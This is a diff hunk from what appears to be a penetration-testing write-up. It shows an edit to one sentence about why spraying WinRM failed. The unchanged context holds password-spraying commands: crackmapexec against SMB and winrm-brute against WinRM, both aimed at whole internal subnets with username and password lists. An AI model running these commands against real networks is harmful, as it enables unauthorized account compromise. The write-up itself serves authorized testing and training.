@@ -21,7 +21,7 @@ With these usernames, I attempted to password spray using common business creden
 crackmapexec smb 192.168.1.0/24 -u users.txt -p passwordlist.txt --continue-on-success
 ```
 
-However, I didn’t get anywhere with SMB. So, I moved onto spraying against WinRM, but still nothing—I think this was due to some issues with crackmapexec not working at the time with the winrm service. So, I switched to using winrm-brute for password spraying.
+However, I didn’t get anywhere with SMB. So, I moved onto spraying against WinRM, but still nothing—I think this was likely due to some issues with crackmapexec not working at the time with winrm. So, I switched to using winrm-brute for password spraying.
 
 ```bash
 winrm-brute --hosts 10.10.10.0/24 --usernames users.txt --passwords common_passwords.txt
